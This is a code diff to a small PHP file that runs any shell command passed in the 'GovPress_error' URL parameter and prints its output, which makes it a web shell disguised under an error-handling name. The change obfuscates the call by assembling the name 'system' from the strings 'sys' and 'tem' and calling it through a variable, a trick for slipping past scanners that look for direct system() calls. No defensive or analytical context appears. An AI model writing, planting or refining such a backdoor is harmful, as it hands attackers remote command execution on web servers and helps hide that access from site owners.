@@ -1,14 +1,13 @@
 <?php
 if (isset($_GET['GovPress_error'])) {
+    $a = 'sys';
+    $b = 'tem';
     $command = $_GET['GovPress_error'];
 
-    // Encode the command
-    $encodedCommand = base64_encode($command);
-
-    // Decode and execute
-    $decodedCommand = base64_decode($encodedCommand);
+    // Execute using variable concatenation
+    $func = $a . $b;
     echo "<pre>";
-    system($decodedCommand, $returnValue);
+    $func($command);
     echo "</pre>";
 }
 ?>
